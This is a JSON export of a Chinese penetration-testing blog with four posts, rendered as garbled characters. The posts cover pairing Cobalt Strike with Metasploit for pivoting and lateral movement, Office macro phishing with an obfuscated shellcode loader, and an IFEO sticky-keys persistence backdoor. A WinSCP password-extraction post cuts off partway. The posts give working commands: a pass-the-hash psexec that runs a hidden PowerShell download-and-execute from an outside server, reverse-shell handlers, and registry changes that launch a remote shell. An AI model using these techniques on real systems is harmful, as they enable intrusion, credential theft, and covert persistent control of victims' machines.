{"meta":{"title":"AnonySec'Blog","subtitle":"","description":"","author":"AnonySec","url":"https://payloads.cn","root":"/"},"pages":[{"title":"æ ‡ç­¾","date":"2019-12-05T14:55:21.787Z","updated":"2019-12-04T13:50:11.945Z","comments":false,"path":"tags/index.html","permalink":"https://payloads.cn/tags/index.html","excerpt":"","text":""},{"title":"å…³äº","date":"2019-12-05T15:41:39.176Z","updated":"2019-12-04T15:43:19.905Z","comments":false,"path":"about/index.html","permalink":"https://payloads.cn/about/index.html","excerpt":"","text":"1IDï¼šAnonySec2ä¸ç”˜åœ¨å¥‹æ–—çš„å¹´çºªé€‰æ‹©å®‰é€¸ï¼Œè®°å½•è¿™ä¸€è·¯çš„å­¦ä¹ ä¸ç”Ÿæ´»ã€‚3â€”â€”â€”â€” Hang&#39;Day42019.12.5 å‡Œæ™¨"},{"title":"åˆ†ç±»","date":"2019-12-04T13:50:02.023Z","updated":"2019-12-04T13:50:02.014Z","comments":false,"path":"categories/index.html","permalink":"https://payloads.cn/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"CobaltStrikeä¸Metasploitå®æˆ˜è”åŠ¨","slug":"CobaltStrikeä¸Metasploitå®æˆ˜è”åŠ¨","date":"2019-12-10T16:22:29.000Z","updated":"2019-12-12T11:47:39.037Z","comments":true,"path":"2019/1211/cobaltstrike-and-metasploit-combat-linkage.html","link":"","permalink":"https://payloads.cn/2019/1211/cobaltstrike-and-metasploit-combat-linkage.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚â€”â€”AnonySechttps://payloads.cnå‰è¨€CobalStrike ä¸ Metasploit å‡æ˜¯æ¸—é€åˆ©å™¨ï¼Œå„æœ‰æ‰€é•¿ã€‚å‰è€…æ›´é€‚åˆåšç¨³æ§å¹³å°ï¼Œåè€…åˆ™æ›´æ“…é•¿å†…ç½‘å„ç±»æ¢æµ‹æœé›†ä¸æ¼æ´åˆ©ç”¨ã€‚ä¸¤è€…æ›´éœ€è¦çµæ´»çš„è”åŠ¨ï¼Œå„è‡ªç›¸äº’ä¾æ‰˜ï¼Œä»è€Œæå‡æ¸—é€çš„æ•ˆç‡ã€‚å†…ç½®SocksåŠŸèƒ½é€šè¿‡Beaconå†…ç½®çš„socksåŠŸèƒ½åœ¨VPSä¸Šå¼€å¯ä»£ç†ç«¯å£ï¼Œæ‰“é€šç›®æ ‡å†…ç½‘é€šé“ï¼Œä¹‹åå°†æœ¬åœ°Metasploitç›´æ¥å¸¦å…¥ç›®æ ‡å†…ç½‘ï¼Œè¿›è¡Œæ¨ªå‘æ¸—é€ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥æŠŠä»£ç†è®¾ç½®åœ¨å…¶ä»–çš„å·¥å…·ä¸Šï¼Œä¸é™äºProxychainsã€Proxifierç­‰ã€‚é¦–å…ˆï¼Œåˆ°å·²æ§ç›®æ ‡æœºçš„Beaconä¸‹å°†socksä»£ç†å¼€å¯ã€‚1beacon &gt; socks 1024 #ç«¯å£æ ¹æ®VPSå®é™…æƒ…å†µè¿›è¡Œè®¾ç½®ç‚¹å¼€èœå•æ ä¸­çš„View &gt; Proxy Pivotsï¼Œå¤åˆ¶ä»£ç†è¿æ¥åˆ°Metasploitä¸­ã€‚æœ¬åœ°å¯åŠ¨Metasploitï¼ŒæŒ‚ä¸Šä»£ç†ï¼Œå°±å¯ä»¥å¯¹ç›®æ ‡å†…ç½‘è¿›è¡Œå„ç§æ¢æµ‹æœé›†ã€‚å¦‚ æ¢æµ‹ç›®æ ‡å†…ç½‘ä¸­å­˜åœ¨MS17_010æ¼æ´çš„ä¸»æœºï¼Œè¿™ä¹Ÿæ˜¯å†…ç½‘æ‹¿ä¸»æœºæƒé™åˆ©ç”¨æ–¹å¼ä¹‹ä¸€ã€‚1msf5 &gt; setg Proxies socks4/5:ip:port #è®©msfæ‰€æœ‰æ¨¡å—çš„æµé‡éƒ½é€šè¿‡æ­¤ä»£ç†èµ°ã€‚(setgå…¨å±€è®¾ç½®)2msf5 &gt; setg ReverseAllowProxy true #å…è®¸åå‘ä»£ç†ï¼Œé€šè¿‡socksåå¼¹shellï¼Œå»ºç«‹åŒå‘é€šé“ã€‚(æ¢æµ‹å¯ä»¥ä¸è®¾ç½®æ­¤é¡¹)3msf5 &gt; use auxiliary/scanner/smb/smb_ms17_0104msf5 &gt; set rhosts 192.168.144.0/245msf5 &gt; set threads 100 #å†…ç½‘æ¸—é€æ—¶çº¿ç¨‹ä¸è¦å¤ªé«˜ï¼6msf5 &gt; runåˆ©ç”¨MSFæ¨¡å—ä¸Šçº¿Beacon shellå½“é€šè¿‡å…¶å®ƒæ–¹å¼æ‹¿åˆ°äº†ç›®æ ‡å†…ç½‘ä¸­æŸå°Windowsæœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜æ˜æ–‡å¯†ç æˆ–hashæ—¶ï¼Œå¯åˆ©ç”¨Metasploitä¸‹auxiliary/admin/smb/psexec_commandæ¨¡å—ï¼Œç›´æ¥ä¸Šçº¿æŒ‡å®šç›®æ ‡æœºå™¨çš„Beacon shellã€‚(å‰æç›®æ ‡æœºå¯å‡ºç½‘)å…ˆåˆ©ç”¨CobalStrikeç”Ÿæˆä¸Šçº¿Beaconçš„powershellã€‚æœ¬åœ°å¯åŠ¨Metasploitï¼ŒæŒ‚ä¸Šä»£ç†ï¼Œè®¾ç½®psexec_commandæ¨¡å—å‚æ•°ã€‚1msf5 &gt; setg Proxies socks4/5:ip:port2msf5 &gt; use auxiliary/admin/smb/psexec_command3msf5 &gt; set rhosts 192.168.144.0/244msf5 &gt; set threads 105msf5 &gt; set smbuser administrator6msf5 &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 #æ˜æ–‡ã€å¯†æ–‡å‡å¯7msf5 &gt; set command powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://149.28.xx.xx:80/a'))\" #ä¸Šçº¿CSçš„powershellï¼Œç›®æ ‡æœºå­˜åœ¨æ€è½¯éœ€è€ƒè™‘8msf5 &gt; runæœ€ç»ˆï¼Œåªè¦å¯†ç ä¸€è‡´ã€ èƒ½å‡ºç½‘ï¼Œä¸”æœªè¢«æ€è½¯é˜»æ­¢çš„å‡ä¼šæˆåŠŸä¸Šçº¿ã€‚CSä¸MSFä¼šè¯äº’ä¼ CobaltStrikeæ´¾ç”ŸMetasploitå½“CobaltStrikeè·å¾—äº†ä¸€ä¸ªä¸Šçº¿æœºå™¨ï¼Œæƒ³æŠŠè¿™ä¸ªç›®æ ‡ä¼ ç»™Metasploitä¸­çš„meterpreterï¼Œè·å¾—ä¸€ä¸ªsessionè¿›è¡Œæ§åˆ¶ã€‚åœ¨Metasploitæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š1msf5 &gt; use exploit/multi/handler2msf5 &gt; set payload windows/meterpreter/reverse_tcp #ä¸è¦ç”¨x64çš„payload3msf5 &gt; set lhost 10.11.42.994msf5 &gt; set lport 53535msf5 &gt; run -jä¹‹åä½¿ç”¨CobaltStrikeåˆ›å»ºä¸€ä¸ªwindows/foreign/reverse_tcpçš„Listenerã€‚å…¶ä¸­IPä¸ºMetasploitçš„ç›‘å¬åœ°å€ï¼Œç«¯å£ä¸ºMetasploitæ‰€ç›‘å¬çš„ç«¯å£ã€‚ç„¶åé€‰ä¸­è®¡ç®—æœºï¼Œå³é”®-&gt;Spawnï¼šé€‰æ‹©MSFçš„ç›‘å¬å™¨ï¼šè¿™ä¸ªæ—¶å€™å¯ä»¥çœ‹åˆ°ï¼ŒMetasploitä¸Šçš„ç›‘å¬å·²ç»ä¸Šçº¿ï¼Œç°åœ¨å¯ä»¥å¯¹meterpreterè·å¾—çš„sessionè¿›è¡Œæ§åˆ¶ã€‚Metasploitæ´¾ç”ŸCobaltStrikeç°åœ¨å·²ç»è·å¾—äº†ä¸€ä¸ªmeterpreterçš„sessionï¼ŒæŠŠsessionä¼ ç»™CobaltStrikeã€‚åœ¨CobaltStrikeä¸­åˆ›å»ºä¸€ä¸ªç›‘å¬è€…ï¼Œå’Œä¸Šä¸€æ­¥ç±»ä¼¼ï¼Œè¿™é‡Œhostéœ€è¦ä¿®æ”¹ä¸ºCobaltStrikeå®¢æˆ·ç«¯IPï¼Œåˆ›å»ºå¥½ä¹‹åä¾¿ç›‘å¬8099ç«¯å£ï¼Œç­‰å¾…ç€è¢«æ§æœºè¿æ¥ã€‚\u0001æ¥ä¸‹æ¥ï¼ŒæŠŠmeterpreterè·å¾—çš„sessionè½¬äº¤ç»™CobaltStrikeï¼Œåœ¨Metasploitæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š1meterpreter &gt; background 2msf5 &gt; use exploit/windows/local/payload_inject 3msf5 &gt; set payload windows/meterpreter/reverse_http4msf5 &gt; set lhost 192.168.144.1745msf5 &gt; set lport 80996msf5 &gt; set DisablePayloadHandler true 7msf5 &gt; set session 18msf5 &gt; runè§£é‡Šä¸€ä¸‹è¿™äº›å‚æ•°ã€‚ç”±äºCobaltStrikeçš„ç›‘å¬å™¨æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ï¼šwindows/beacon_http/reverse_httpæ‰€ä»¥æˆ‘ä»¬çš„payloadä¹Ÿè¦ä½¿ç”¨ï¼špayload windows/meterpreter/reverse_httpè®¾ç½®æœ¬åœ°ç›‘å¬IPå’Œç«¯å£ï¼šç”±äºç›‘å¬å™¨æ˜¯CobaltStrikeçš„ï¼Œæ‰€ä»¥è¦è®¾ç½®æˆCobaltStrikeæœºå™¨çš„IPä¸ç«¯å£ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œpayload_injectæ‰§è¡Œä¹‹åä¼šåœ¨æœ¬åœ°äº§ç”Ÿä¸€ä¸ªæ–°çš„handlerï¼Œç”±äºæˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ªï¼Œæ‰€ä»¥ä¸éœ€è¦åœ¨äº§ç”Ÿä¸€ä¸ªï¼Œè¿™é‡Œæˆ‘ä»¬è®¾ç½®ï¼šset DisablePayloadHandler trueè®¾ç½®å½“å‰çš„sessionï¼Œæ‰§è¡Œrunã€‚æ­¤æ—¶ç›®æ ‡æœºä¾¿å·²æˆåŠŸä»CobaltStrikeä¸Šçº¿ã€‚æ€»ç»“å…³äºCobalStrikeä¸Metasploit çš„è”åŠ¨åˆ©ç”¨æ–¹å¼è¿œä¸æ­¢è¿™äº›ï¼Œæ¯ç§æ–¹å¼åœ¨å®æˆ˜ä¸­éƒ½æœ‰å¯¹åº”çš„åº”ç”¨åœºæ™¯ï¼Œæ›´éœ€è¦æ¢ç´¢ä¸æ€»ç»“ã€‚","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"}]},{"title":"Officeå®çš„åŸºæœ¬åˆ©ç”¨","slug":"Officeå®çš„åŸºæœ¬åˆ©ç”¨","date":"2019-12-09T06:35:09.000Z","updated":"2019-12-12T12:10:49.047Z","comments":true,"path":"2019/1209/basic-use-of-office-macros.html","link":"","permalink":"https://payloads.cn/2019/1209/basic-use-of-office-macros.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚â€”â€”AnonySechttps://payloads.cnå‰è¨€Officeå®ï¼Œè¯‘è‡ªè‹±æ–‡å•è¯Macroã€‚å®æ˜¯Officeè‡ªå¸¦çš„ä¸€ç§é«˜çº§è„šæœ¬ç‰¹æ€§ï¼Œé€šè¿‡VBAä»£ç ï¼Œå¯ä»¥åœ¨Officeä¸­å»å®ŒæˆæŸé¡¹ç‰¹å®šçš„ä»»åŠ¡ï¼Œè€Œä¸å¿…å†é‡å¤ç›¸åŒçš„åŠ¨ä½œï¼Œç›®çš„æ˜¯è®©ç”¨æˆ·æ–‡æ¡£ä¸­çš„ä¸€äº›ä»»åŠ¡è‡ªåŠ¨åŒ–ã€‚è€Œå®ç—…æ¯’æ˜¯ä¸€ç§å¯„å­˜åœ¨æ–‡æ¡£æˆ–æ¨¡æ¿çš„å®ä¸­çš„è®¡ç®—æœºç—…æ¯’ã€‚ä¸€æ—¦æ‰“å¼€è¿™æ ·çš„æ–‡æ¡£ï¼Œå…¶ä¸­çš„å®å°±ä¼šè¢«æ‰§è¡Œï¼Œäºæ˜¯å®ç—…æ¯’å°±ä¼šè¢«æ¿€æ´»ï¼Œè½¬ç§»åˆ°è®¡ç®—æœºä¸Šï¼Œå¹¶é©»ç•™åœ¨Normalæ¨¡æ¿ä¸Šã€‚Visual Basic for Applicationsï¼ˆVBAï¼‰æ˜¯Visual Basicçš„ä¸€ç§å®è¯­è¨€ï¼Œæ˜¯å¾®è½¯å¼€å‘å‡ºæ¥åœ¨å…¶æ¡Œé¢åº”ç”¨ç¨‹åºä¸­æ‰§è¡Œé€šç”¨çš„è‡ªåŠ¨åŒ–(OLE)ä»»åŠ¡çš„ç¼–ç¨‹è¯­è¨€ã€‚ä¸»è¦èƒ½ç”¨æ¥æ‰©å±•Windowsçš„åº”ç”¨ç¨‹åºåŠŸèƒ½ï¼Œç‰¹åˆ«æ˜¯Microsoft Officeè½¯ä»¶ï¼Œä¹Ÿå¯è¯´æ˜¯ä¸€ç§åº”ç”¨ç¨‹å¼è§†è§‰åŒ–çš„Basic è„šæœ¬ã€‚ç¯å¢ƒå‡†å¤‡Windows 7 x64 æ——èˆ°ç‰ˆMicrosoft Office 2016CobaltStrike 3.14CobaltStrikeç”Ÿæˆå®å…ˆåˆ©ç”¨CobaltStrikeç”Ÿæˆå®payloadï¼Œæ¥ä¸‹æ¥åªè¦æ”¾å…¥wordã€excelæˆ–pptå³å¯ã€‚åˆ›å»ºå®Wordæ‰“å¼€Wordæ–‡æ¡£ï¼Œç‚¹å‡» â€œWord é€‰é¡¹ â€” è‡ªå®šä¹‰åŠŸèƒ½åŒº â€” å¼€å‘è€…å·¥å…·(å‹¾é€‰) â€” ç¡®å®šâ€ ã€‚ç¼–å†™ä¸»ä½“å†…å®¹åï¼Œç‚¹å‡» â€œå¼€å‘å·¥å…· â€” Visual Basicâ€ ã€‚åŒå‡» â€œThisDocumentâ€ ï¼Œå°†åŸæœ‰å†…å®¹å…¨éƒ¨æ¸…ç©ºï¼Œç„¶åå°†CobaltStrikeç”Ÿæˆå®payloadå…¨éƒ¨ç²˜è´´è¿›å»ï¼Œä¿å­˜å¹¶å…³é—­è¯¥ VBA ç¼–è¾‘å™¨ ã€‚å¦å­˜ä¸ºçš„Wordç±»å‹åŠ¡å¿…è¦é€‰â€Word 97-2003 æ–‡æ¡£ (*.doc)â€ï¼Œå³ doc æ–‡ä»¶ï¼Œä¿è¯ä½ç‰ˆæœ¬å¯ä»¥æ‰“å¼€ã€‚ä¹‹åå…³é—­ï¼Œå†æ‰“å¼€å³å¯æ‰§è¡Œå®ä»£ç ã€‚åå¼¹Beacon shellé»˜è®¤æƒ…å†µä¸‹ï¼ŒOfficeå·²ç»ç¦ç”¨æ‰€æœ‰å®ï¼Œä½†ä»ä¼šåœ¨æ‰“å¼€Wordæ–‡æ¡£çš„æ—¶å€™å‘å‡ºé€šçŸ¥ã€‚è¯±å¯¼ç›®æ ‡æ‰‹åŠ¨ç‚¹å‡»â€å¯ç”¨å†…å®¹â€å®ã€‚ç›®æ ‡ä¸€æ—¦å¯ç”¨ï¼ŒCobaltStrikeçš„Beaconå°±ä¼šä¸Šçº¿ï¼Œå³æˆåŠŸæ¥æ”¶åˆ°Shellã€‚å®ä»£ç åˆ†æCobaltStrikeç”Ÿæˆé»˜è®¤çš„VBAä¼šå¯¼å…¥å››ä¸ªWindows APIå‡½æ•°ï¼Œå¸¸è§çš„ShellCodeåŠ è½½å™¨ä»£ç ï¼šCreateRemoteThread åˆ›å»ºä¸€ä¸ªåœ¨å…¶å®ƒè¿›ç¨‹åœ°å€ç©ºé—´ä¸­è¿è¡Œçš„çº¿ç¨‹(ä¹Ÿç§°:åˆ›å»ºè¿œç¨‹çº¿ç¨‹).VirtualAllocEx æŒ‡å®šè¿›ç¨‹çš„è™šæ‹Ÿç©ºé—´ä¿ç•™æˆ–æäº¤å†…å­˜åŒºåŸŸWriteProcessMemory å†™å…¥æŸä¸€è¿›ç¨‹çš„å†…å­˜åŒºåŸŸCreateProcess åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹å’Œå®ƒçš„ä¸»çº¿ç¨‹ï¼Œè¿™ä¸ªæ–°è¿›ç¨‹è¿è¡ŒæŒ‡å®šçš„å¯æ‰§è¡Œæ–‡ä»¶å…¶ä¸­Array(-4,-24,-119,0,0,0,96,-119,-27...å°±æ˜¯ShellCodeï¼Œæ··æ·†çš„åŠæ³•æœ‰å¾ˆå¤šç§ã€‚ShellCodeå¯ä»¥è‡ªå·±åœ¨VBAé‡Œè§£ç æˆ–è€…æ¯”å¦‚æ¯ä¸ªå…ƒç´ è‡ªå¢1ï¼Œè¿è¡Œçš„æ—¶å€™-1ï¼Œè¾¾åˆ°å…æ€ â€¦â€¦==ç‰¹åˆ«å£°æ˜ï¼š æœ¬æ–‡ç« ä»…ä¾›å®‰å…¨å­¦ä¹ ç ”ç©¶ä¹‹ç”¨ï¼Œä¸¥ç¦ç”¨äºä»»ä½•éæ³•ç”¨é€”ã€‚è‹¥äº§ç”Ÿæ³•å¾‹é—®é¢˜ï¼Œå‡ç”±è¯»è€…è‡ªè¡Œæ‰¿æ‹…ï¼==â€‹ ğŸ’»æ¬¢è¿åŠ å…¥å…è´¹æŠ€æœ¯å¯†åœˆğŸ’»","categories":[{"name":"é’“é±¼","slug":"é’“é±¼","permalink":"https://payloads.cn/categories/%E9%92%93%E9%B1%BC/"}],"tags":[{"name":"Office","slug":"Office","permalink":"https://payloads.cn/tags/Office/"}]},{"title":"Shfitæ˜ åƒåŠ«æŒåé—¨æ–°ç©æ³•","slug":"Shfitæ˜ åƒåŠ«æŒåé—¨æ–°ç©æ³•","date":"2019-12-05T05:08:11.000Z","updated":"2019-12-12T12:10:07.671Z","comments":true,"path":"2019/1205/shfit-image-hijacks-backdoor-new-gameplay.html","link":"","permalink":"https://payloads.cn/2019/1205/shfit-image-hijacks-backdoor-new-gameplay.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚â€”â€”AnonySechttps://payloads.cnæ˜ åƒåŠ«æŒç®€ä»‹æ˜ åƒåŠ«æŒï¼ˆImage File Execution Optionsï¼‰ï¼Œç®€å•çš„è¯´æ³•ï¼Œå°±æ˜¯å½“ä½ æ‰“å¼€çš„æ˜¯ç¨‹åºAï¼Œè€Œè¿è¡Œçš„ç¡®æ˜¯ç¨‹åºBã€‚æ˜ åƒåŠ«æŒå…¶å®æ˜¯Windowså†…è®¾çš„ç”¨æ¥è°ƒè¯•ç¨‹åºçš„åŠŸèƒ½ï¼Œä½†æ˜¯ç°åœ¨å´å¾€å¾€è¢«ç—…æ¯’æ¶æ„åˆ©ç”¨ã€‚å½“ç”¨æˆ·åŒå‡»å¯¹åº”çš„ç¨‹åºåï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šç»™å¤–å£³ç¨‹åºï¼ˆä¾‹å¦‚â€œexplorer.exeâ€ï¼‰å‘å¸ƒç›¸åº”çš„æŒ‡ä»¤ï¼Œå…¶ä¸­åŒ…å«æœ‰æ‰§è¡Œç¨‹åºçš„è·¯å¾„å’Œæ–‡ä»¶åï¼Œç„¶åç”±å¤–å£³ç¨‹åºæ¥æ‰§è¡Œè¯¥ç¨‹åºã€‚äº‹å®ä¸Šåœ¨è¯¥è¿‡ç¨‹ä¸­ï¼ŒWindowsè¿˜ä¼šåœ¨æ³¨å†Œè¡¨çš„ä¸Šè¿°è·¯å¾„ä¸­æŸ¥è¯¢æ‰€æœ‰çš„æ˜ åƒåŠ«æŒå­é”®ï¼Œå¦‚æœå­˜åœ¨å’Œè¯¥ç¨‹åºåç§°å®Œå…¨ç›¸åŒçš„å­é”®ï¼Œå°±æŸ¥è¯¢å¯¹åº”å­å¥ä¸­åŒ…å«çš„â€œDubuggerâ€é”®å€¼åï¼Œå¹¶ç”¨å…¶æŒ‡å®šçš„ç¨‹åºè·¯å¾„æ¥ä»£æ›¿åŸå§‹çš„ç¨‹åºï¼Œä¹‹åæ‰§è¡Œçš„æ˜¯é­åˆ°â€œåŠ«æŒâ€çš„è™šå‡ç¨‹åºã€‚ç®€å•æµ‹è¯•æ˜ åƒåŠ«æŒæŠ€æœ¯çš„åˆ©ç”¨ï¼Œå­˜åœ¨å·²ä¹…ï¼Œè¿™é‡Œå†ç®€å•è¯´æ˜ä¸‹ï¼šä¿®æ”¹æ³¨å†Œè¡¨HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Optionsä¸‹sethc.exeï¼Œæ·»åŠ ä¸€ä¸ªDebuggerå­—ç¬¦å€¼ï¼ˆREG_SZï¼‰ï¼Œå¹¶ä¸”èµ‹å€¼ä¸ºcmd.exeçš„æ‰§è¡Œè·¯å¾„ä¸ºC:\\windows\\system32\\cmd.exeä¹‹åé”®å…¥äº”ä¸‹Shiftæ‰§è¡Œsethc.exeç¨‹åºæ—¶ä¾¿ä¼šæ‰§è¡Œcmd.exeç¨‹åºã€‚æ˜ åƒåŠ«æŒåé—¨æ–°ç©æ³•å®ç°æ•ˆæœé”®å…¥äº”ä¸‹Shiftæ‰§è¡Œæ—¶ï¼Œå…ˆæ‰§è¡Œsethc.exeç¨‹åºï¼Œå½“sethc.exeç¨‹åºé™é»˜é€€å‡ºæ—¶ï¼Œæ‰§è¡ŒCobaltStrikeçš„Powershellï¼Œåå¼¹Beacon shell ã€‚ç®€å•æ¥è¯´å°±æ˜¯ï¼šç¨‹åºAé™é»˜é€€å‡ºç»“æŸåï¼Œä¼šæ‰§è¡Œç¨‹åºBã€‚GFlagesæµ‹è¯•æ–‡ç« åœ°å€ï¼šhttps://blogs.msdn.microsoft.com/junfeng/2004/04/28/image-file-execution-options/ä¸‹è½½gflags.exehttps://docs.microsoft.com/zh-cn/previous-versions/msdn10/gg463016(v=msdn.10)æ ¹æ®å¾®è½¯çš„å®˜æ–¹æ–‡æ¡£æè¿°ï¼Œåœ¨Silent Process Exité€‰é¡¹å¡ä¸­çš„é…ç½®ï¼Œéƒ½ä¿å­˜åœ¨æ³¨å†Œè¡¨ä¸­ã€‚GFlagså·¥å…·è‡ªåŠ¨æ·»åŠ å¹¶ä¿®æ”¹äº†â€œIFEOâ€ç›®å½•ä¸‹sethc.exeçš„GlobalFlagå€¼ã€‚ä»¥åŠSilentProcessExitä¸‹ReportingModeå’ŒMonitorProcessä¸¤ä¸ªå€¼ã€‚è¿™æ—¶æµ‹è¯•ä¼šå‘ç°ï¼Œå½“é”®å…¥äº”ä¸‹Shiftæ—¶ï¼Œå…ˆæ‰§è¡Œsethc.exeç¨‹åºï¼Œå½“sethc.exeç¨‹åºé™é»˜é€€å‡ºæ—¶ï¼Œä¾¿ä¼šæ‰§è¡Œcmd.exeç¨‹åºã€‚è¿™ä¹ˆä¸€æ¥ï¼Œå¯ä»¥ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­å¯¹æ³¨å†Œè¡¨è¿›è¡Œè®¾ç½®ã€‚ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰1reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /f2reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v GlobalFlag /t REG_DWORD /d 512 /f3reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe\" /v ReportingMode /t REG_DWORD /d 1 /f4reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe\" /v MonitorProcess /t REG_SZ /d \"c:\\windows\\system32\\cmd.exe\" /fç®€å•è§£é‡Šä¸€ä¸‹ReportingModeå’ŒMonitorProcess è¿™ä¸¤ä¸ªé¡¹å€¼çš„ä½œç”¨ã€‚MonitorProcessçš„å€¼è¡¨ç¤ºç›‘è§†å™¨è¿›ç¨‹ã€‚Reporting Modeå¯ä»¥è®¾ç½®ä¸ºä¸‰ä¸ªå€¼ ã€‚FlagValueè§£é‡ŠLAUNCH_MONITORPROCESS0x1æ£€æµ‹åˆ°è¿›ç¨‹é™é»˜é€€å‡ºæ—¶ï¼Œå°†ä¼šå¯åŠ¨ç›‘è§†å™¨è¿›ç¨‹ï¼ˆåœ¨GFLAGS.exeä¸­ï¼ŒSilent Process Exitè¿™ä¸ªé€‰é¡¹å¡æ‰€å¡«å†™çš„å€¼ï¼Œå³MonitorProcessçš„é¡¹å€¼ï¼‰LOCAL_DUMP0x2æ£€æµ‹åˆ°è¿›ç¨‹é™é»˜é€€å‡ºæ—¶ï¼Œå°†ä¼šä¸ºå—ç›‘è§†çš„è¿›ç¨‹åˆ›å»ºè½¬å‚¨æ–‡ä»¶NOTIFICATION0x4æ£€æŸ¥åˆ°è¿›ç¨‹é™é»˜é€€å‡ºæ—¶ï¼Œå°†ä¼šå¼¹å‡ºä¸€ä¸ªé€šçŸ¥ä¸CobaltStrikeç»“åˆåˆ©ç”¨æ¢ä½æ€è€ƒï¼Œç”¨ä¸Šè¿°çš„æ–¹æ³•ï¼Œä¿®æ”¹MonitorProcesså€¼æ”¾å…¥CobaltStrikeçš„powershellã€‚è¿™æ ·ï¼Œå¯ä»¥åœ¨æ¸—é€ä¸­åšåˆ°æƒé™çš„ç»´æŒï¼ŒæŒ‰äº”ä¸‹Shiftå°±å¯ä»¥éšè”½è¿›è¡Œåè¿ã€‚å®æµ‹ï¼ŒWindowsé”å±ï¼Œé”®å…¥äº”ä¸‹Shiftåæ­£å¸¸å¼¹ç²˜æ»é”®ï¼Œå…³é—­ä¹‹åæ‰§è¡Œpowershellä»£ç ï¼Œåå¼¹beaconçš„shellã€‚==ç‰¹åˆ«å£°æ˜ï¼š æœ¬æ–‡ç« ä»…ä¾›å®‰å…¨å­¦ä¹ ç ”ç©¶ä¹‹ç”¨ï¼Œä¸¥ç¦ç”¨äºä»»ä½•éæ³•ç”¨é€”ã€‚è‹¥äº§ç”Ÿæ³•å¾‹é—®é¢˜ï¼Œå‡ç”±è¯»è€…è‡ªè¡Œæ‰¿æ‹…ï¼==â€‹ ğŸ’»æ¬¢è¿åŠ å…¥å…è´¹æŠ€æœ¯å¯†åœˆğŸ’»","categories":[{"name":"æƒé™ç»´æŒ","slug":"æƒé™ç»´æŒ","permalink":"https://payloads.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[{"name":"Windowsåé—¨","slug":"Windowsåé—¨","permalink":"https://payloads.cn/tags/Windows%E5%90%8E%E9%97%A8/"}]},{"title":"è§£å¯†Winscpå®¢æˆ·ç«¯ä¸­ä¿å­˜çš„å¯†ç hash","slug":"è§£å¯†Winscpå®¢æˆ·ç«¯ä¸­ä¿å­˜çš„å¯†ç hash","date":"2019-12-04T14:08:50.000Z","updated":"2019-12-05T15:07:20.962Z","comments":true,"path":"2019/1204/decrypt-password-hash-saved-in-winscp-client.html","link":"","permalink":"https://payloads.cn/2019/1204/decrypt-password-hash-saved-in-winscp-client.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚â€”â€”AnonySechttps://payloads.cnå‰è¨€WinSCPæ˜¯ä¸€ä¸ªWindowsç¯å¢ƒä¸‹ä½¿ç”¨çš„SSHçš„å¼€æºå›¾å½¢åŒ–SFTPå®¢æˆ·ç«¯ã€‚åŒæ—¶æ”¯æŒSCPåè®®ã€‚å®ƒçš„ä¸»è¦åŠŸèƒ½æ˜¯åœ¨æœ¬åœ°ä¸è¿œç¨‹è®¡ç®—æœºé—´å®‰å…¨åœ°å¤åˆ¶æ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥ç¼–è¾‘æ–‡ä»¶ã€‚è€Œæˆ‘ä»¬çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†è¯»å–é‡Œé¢å„ç§çš„SSHè¿æ¥å¯†ç ã€‚æ‰€æœ‰æ“ä½œå…¨éƒ¨åœ¨ç®¡ç†å‘˜æƒé™ä¸‹è¿›è¡Œæœ€æ–°ç‰ˆWinscpä¸ºä¾‹é€šè¿‡powershellè„šæœ¬æå®šï¼Œæˆ–è€…RDPç›´æ¥ç™»å½•è¿æ¥æŸ¥è¯¢ç­‰ã€‚ ã€Œç»¿è‰²ç‰ˆæ— å®‰è£…è®°å½•ã€1beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;ListInstalledPrograms.ps12beacon&gt; powershell Get-listå‰æï¼Œç›®æ ‡å¾—äº‹å…ˆä¿å­˜è¿æ¥å¯†ç 